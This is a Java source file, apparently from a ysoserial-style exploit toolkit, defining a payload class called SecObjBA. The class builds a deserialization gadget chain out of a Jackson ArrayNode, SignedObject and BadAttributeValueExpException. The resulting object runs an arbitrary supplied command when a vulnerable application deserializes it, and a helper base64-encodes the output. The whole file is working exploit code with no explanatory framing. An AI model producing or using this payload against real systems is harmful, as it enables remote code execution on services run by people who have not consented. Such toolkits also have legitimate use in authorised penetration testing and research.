package ysoserial.payloads;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.POJONode;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.lang.reflect.Field;
import java.util.Base64;

import static ysoserial.payloads.util.Gadgets.createSignedObject;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies("jackson:jackson")
@Authors({ Authors.J1an })
public class SecObjBA extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        SignedObject signedObject = createSignedObject(command);
        ObjectMapper mapper = new ObjectMapper();
        ArrayNode arr = mapper.createArrayNode();
        arr.addPOJO(signedObject);
        BadAttributeValueExpException val = new BadAttributeValueExpException("J1an");
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, arr);
//        String output = getBase64Data(val);
//        System.out.println(output);
        return val;
    }
    public static String getBase64Data(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SecObjBA.class, args);
    }
}
